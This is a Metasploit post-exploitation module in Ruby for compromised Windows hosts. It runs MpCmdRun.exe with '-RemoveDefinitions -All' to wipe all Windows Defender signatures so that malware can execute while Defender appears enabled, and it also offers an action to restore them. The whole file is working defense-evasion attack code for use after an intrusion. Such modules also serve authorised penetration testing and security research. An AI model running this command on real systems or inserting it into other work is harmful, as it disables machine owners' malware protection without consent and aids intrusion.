##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Disable Windows Defender Signatures',
        'Description' => %q{
          This module with appropriate rights let to use the Windows Defender command-line utility a run and automation
          tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.
          The tool is prominently used for scheduling scans and updating the signature or definition files,
          but there is a switch created to restore the installed signature definitions to a previous backup copy or
          to the original default set of signatures which is none, disabling all the signatures and allowing malware
          to execute even with the Windows Defender solution enabled.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'metasploit@[at]csiete.org',
          'luisco100 <luisco100[at]gmail.com>'
        ], # Module author
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Actions' => [
          [ 'ROLLBACK', { 'Description' => 'Rollback Defender signatures' } ],
          [ 'UPDATE', { 'Description' => 'Update Defender signatures' } ]
        ],
        'DefaultAction' => 'ROLLBACK',
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          # if you rollback the signatures, that resource is lost
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    # Are we system?
    if !is_system?
      fail_with(Failure::NoAccess, 'You must be System to run this Module')
    end

    # Is the binary there?
    if client.arch == ARCH_X86 && client.arch != sysinfo['Architecture']
      program_path = session.sys.config.getenv('ProgramW6432')
    else
      program_path = session.sys.config.getenv('ProgramFiles')
    end
    vprint_status("program_path = #{program_path}")
    file_path = program_path + '\Windows Defender\MpCmdRun.exe'
    vprint_status("file_path = #{file_path}")
    if !exist?(file_path)
      fail_with(Failure::NoAccess, "#{file_path} is not Present")
    end
    # Is defender even enabled?
    defender_disable_key = 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender'
    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, 'DisableAntiSpyware', REGISTRY_VIEW_NATIVE)
    unless disable_key_value.nil? || disable_key_value != 1
      fail_with(Failure::NoTarget, 'Defender is not enabled')
    end

    case action.name
    when 'ROLLBACK'
      print_status('Removing all definitions for Windows Defender')
      cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
    when 'UPDATE'
      print_status('Updating definitions for Windows Defender')
      cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
    else
      fail_with(Failure::BadConfig, 'Unknown action provided!')
    end
    print_status("Running #{cmd}")
    output = cmd_exec(cmd).to_s
    if output.include?('denied')
      print_bad(output)
    else
      print_status(output)
    end
  end
end
